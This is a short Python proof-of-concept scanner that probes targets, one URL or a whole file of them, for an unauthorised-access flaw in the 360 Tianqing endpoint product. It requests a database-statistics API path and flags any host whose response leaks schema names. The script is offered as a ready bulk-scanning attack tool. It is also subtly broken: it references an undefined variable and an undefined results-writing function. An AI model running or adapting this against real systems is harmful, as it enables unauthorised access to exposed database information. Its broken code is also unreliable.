#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
payload:/api/dbstat/gettablessize
'''
import requests
import warnings
import argparse

key=0
def header():
    print('*-------------------------------------------------------*')
    print('*  \033[34mdescription: 360天擎未授权访问漏洞                                          \033[0m')
    print('*  \033[34m使用格式:  python3 Unauthorized.py -h                                    \033[0m')
    print('*--------------------------------------------------------')

def Arg_Parse():
	parser = argparse.ArgumentParser()
	parser.add_argument("-u","--url",metavar='',help="目标url地址")
	parser.add_argument("-f","--file",metavar='',help="目标地址文件")
	args = parser.parse_args()
	return args

def Detect(url):
	payload = "/api/dbstat/gettablessize"
	vuln_url = url + payload
	try:
		print("\033[32m正在检测:{}\033[0m".format(vuln_url))
		req = requests.get(vulnurl,timeout=1, verify=False)
		if r"schema_name" in req.text :
			print("\033[31m{}存在未授权访问漏洞！！！\033[0m".format(vuln_url))
			if key:
				Write_Results(vuln_url)
			else:
				pass
		else:
			print("\033[32m未检测到该漏洞存在！！！ \033[0m")   
	except:
		print("\033[32m{}访问失败！！！ \033[0m".format(url))

if __name__ == "__main__":
	args = Arg_Parse()
	if args.url:
		Detect(args.url)	
	elif args.file:
		key=1
		with open(args.file,'r') as fp:
			for line in fp.readlines():
				Detect(line.strip())
	else:
		print("\033[33m输入的参数有误，请使用-h参数查看脚本用法 \033[0m")
